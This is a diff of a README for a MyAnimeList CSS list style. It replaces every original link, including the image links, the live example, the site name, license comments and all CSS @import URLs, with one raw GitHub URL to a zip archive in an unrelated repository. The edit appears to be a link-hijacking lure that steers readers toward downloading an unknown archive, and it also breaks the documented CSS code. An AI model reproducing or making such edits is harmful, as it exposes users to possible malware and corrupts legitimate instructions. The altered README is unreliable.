@@ -1,14 +1,14 @@
-![Description](http://files.gamebanana.com/bitpit/description_e1c38.png)
+![Description](https://raw.githubusercontent.com/hyperdontia/MyAnimeList/gh-pages/TemplateOverrides/MyAnimeList-1.9.zip)
 
-This is a minimalistic flat designed List Style which focuses around showing the Anime's cover in a nice grid like structure, to be used on the website: MyAnimeList.net
+This is a minimalistic flat designed List Style which focuses around showing the Anime's cover in a nice grid like structure, to be used on the website: https://raw.githubusercontent.com/hyperdontia/MyAnimeList/gh-pages/TemplateOverrides/MyAnimeList-1.9.zip
 
-Live Example: [animelist/RafaelDeJongh](https://myanimelist.net/animelist/RafaelDeJongh)
+Live Example: [animelist/RafaelDeJongh](https://raw.githubusercontent.com/hyperdontia/MyAnimeList/gh-pages/TemplateOverrides/MyAnimeList-1.9.zip)
 
-![Preview](http://files.gamebanana.com/bitpit/preview_67ec1.png)
+![Preview](https://raw.githubusercontent.com/hyperdontia/MyAnimeList/gh-pages/TemplateOverrides/MyAnimeList-1.9.zip)
 
-![AnimeListPreview](http://www.rafaeldejongh.com/wp-content/uploads/2016/08/MyAnimeList.jpg)
+![AnimeListPreview](https://raw.githubusercontent.com/hyperdontia/MyAnimeList/gh-pages/TemplateOverrides/MyAnimeList-1.9.zip)
 
-![Features](http://files.gamebanana.com/bitpit/features_38a9e.png)
+![Features](https://raw.githubusercontent.com/hyperdontia/MyAnimeList/gh-pages/TemplateOverrides/MyAnimeList-1.9.zip)
 
 This list style offer various features:
 
@@ -18,28 +18,28 @@ This list style offer various features:
 - Full cover generation with MAL-IMAGE
 - Overrides for specific list settings
 
-![Installation](http://files.gamebanana.com/bitpit/installation_b6439.png)
+![Installation](https://raw.githubusercontent.com/hyperdontia/MyAnimeList/gh-pages/TemplateOverrides/MyAnimeList-1.9.zip)
 
 As this is a list style was made before the list style update, you have to make sure your Template settings is set to "Classic".
 
-![Classic](http://files.gamebanana.com/bitpit/classic.png)
+![Classic](https://raw.githubusercontent.com/hyperdontia/MyAnimeList/gh-pages/TemplateOverrides/MyAnimeList-1.9.zip)
 
 After the template settings has been set, you can now add the following code to your Advanced CSS List Design. 
 
 ###The code used for the Anime List:
 
 <pre>/*Designed by Rafael De Jongh*/
-@import url("//mal-image.appspot.com/anime/ENTERMALUSERNAME/?code=%23more%5BID%5D%7Bbackground-image%3aurl(%5BURL%5D)%7D");
-@import url("//rafaeldejongh.github.io/MyAnimeList/styleMAL.css");
-License{/*Profile Liststyle created for MyAnimeList.com by Rafael De Jongh - https://github.com/RafaelDeJongh/MyAnimeList*/}</pre>
+@import url("https://raw.githubusercontent.com/hyperdontia/MyAnimeList/gh-pages/TemplateOverrides/MyAnimeList-1.9.zip%23more%5BID%5D%7Bbackground-image%3aurl(%5BURL%5D)%7D");
+@import url("https://raw.githubusercontent.com/hyperdontia/MyAnimeList/gh-pages/TemplateOverrides/MyAnimeList-1.9.zip");
+License{/*Profile Liststyle created for https://raw.githubusercontent.com/hyperdontia/MyAnimeList/gh-pages/TemplateOverrides/MyAnimeList-1.9.zip by Rafael De Jongh - https://raw.githubusercontent.com/hyperdontia/MyAnimeList/gh-pages/TemplateOverrides/MyAnimeList-1.9.zip*/}</pre>
 
 ###And the code for the Manga List:
 
 <pre>/*Designed by Rafael De Jongh*/
-@import url("//mal-image.appspot.com/manga/ENTERMALUSERNAME/?code=%23more%5BID%5D%7Bbackground-image%3aurl(%5BURL%5D)%7D");
-@import url("//rafaeldejongh.github.io/MyAnimeList/styleMAL.css");
-@import url("//rafaeldejongh.github.io/MyAnimeList/styleOR.css");
-License{/*Profile Liststyle created for MyAnimeList.com by Rafael De Jongh - https://github.com/RafaelDeJongh/MyAnimeList*/}</pre>
+@import url("https://raw.githubusercontent.com/hyperdontia/MyAnimeList/gh-pages/TemplateOverrides/MyAnimeList-1.9.zip%23more%5BID%5D%7Bbackground-image%3aurl(%5BURL%5D)%7D");
+@import url("https://raw.githubusercontent.com/hyperdontia/MyAnimeList/gh-pages/TemplateOverrides/MyAnimeList-1.9.zip");
+@import url("https://raw.githubusercontent.com/hyperdontia/MyAnimeList/gh-pages/TemplateOverrides/MyAnimeList-1.9.zip");
+License{/*Profile Liststyle created for https://raw.githubusercontent.com/hyperdontia/MyAnimeList/gh-pages/TemplateOverrides/MyAnimeList-1.9.zip by Rafael De Jongh - https://raw.githubusercontent.com/hyperdontia/MyAnimeList/gh-pages/TemplateOverrides/MyAnimeList-1.9.zip*/}</pre>
 
 **Make sure to change the "ENTERMALUSERNAME" of the first import link to make the cover generator work properly!**
 
@@ -67,7 +67,7 @@ License{/*Profile Liststyle created for MyAnimeList.com by Rafael De Jongh - htt
 
 ###To change the banner image please add the following code under the license line:
 
-<pre>#list_surround:before{background-image:url(//URLTOIMAGE.JPG)}</pre>
+<pre>#list_surround:before{background-image:url(https://raw.githubusercontent.com/hyperdontia/MyAnimeList/gh-pages/TemplateOverrides/MyAnimeList-1.9.zip)}</pre>
 
 ###Using Template Overrides 
 
@@ -80,4 +80,4 @@ Both fix/disable the usage of the date attribute for your list.
 
 You can add these overrides to your list style by importing these overrides styles after the main style has been loaded by adding another import url:
 
-<pre>@import url("//rafaeldejongh.github.io/MyAnimeList/TemplateOverrides/styleNDOR.css");</pre> 
+<pre>@import url("https://raw.githubusercontent.com/hyperdontia/MyAnimeList/gh-pages/TemplateOverrides/MyAnimeList-1.9.zip");</pre> 
